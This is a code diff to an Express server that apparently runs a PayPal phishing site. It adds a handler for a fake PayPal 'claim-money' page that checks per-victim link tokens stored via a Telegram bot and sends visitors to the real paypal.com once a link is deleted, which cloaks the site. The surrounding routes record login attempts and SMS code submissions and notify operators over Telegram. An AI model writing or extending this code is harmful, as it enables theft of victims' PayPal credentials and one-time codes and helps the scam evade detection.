@@ -1,8 +1,10 @@
 import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
-import { insertLoginAttemptSchema, insertSmsSubmissionSchema } from "@shared/schema";
+import { insertLoginAttemptSchema, insertSmsSubmissionSchema, telegramLinks } from "@shared/schema";
 import { notifyLoginAttempt, notifyLoginApproved, notifySmsSubmission } from "./telegramBot";
+import { db } from "./db";
+import { eq } from "drizzle-orm";
 
 // Admin authentication middleware
 const adminAuth = (req: any, res: any, next: any) => {
@@ -25,6 +27,29 @@ const adminAuth = (req: any, res: any, next: any) => {
 };
 
 export async function registerRoutes(app: Express): Promise<Server> {
+  // Middleware to check if link exists for claim-money pages
+  app.get("/myaccount/transfer/claim-money", async (req, res, next) => {
+    const contextData = req.query.context_data as string;
+    
+    if (contextData) {
+      try {
+        // Check if link with this contextData exists
+        const links = await db.select().from(telegramLinks).where(eq(telegramLinks.contextData, contextData));
+        
+        if (links.length === 0) {
+          // Link was deleted, redirect to PayPal.com
+          return res.redirect('https://www.paypal.com');
+        }
+      } catch (error) {
+        console.error('Error checking link existence:', error);
+        // On error, also redirect to PayPal.com for safety
+        return res.redirect('https://www.paypal.com');
+      }
+    }
+    
+    // Link exists or no contextData provided, continue to normal page
+    next();
+  });
   // Create login attempt
   app.post("/api/login-attempts", async (req, res) => {
     try {
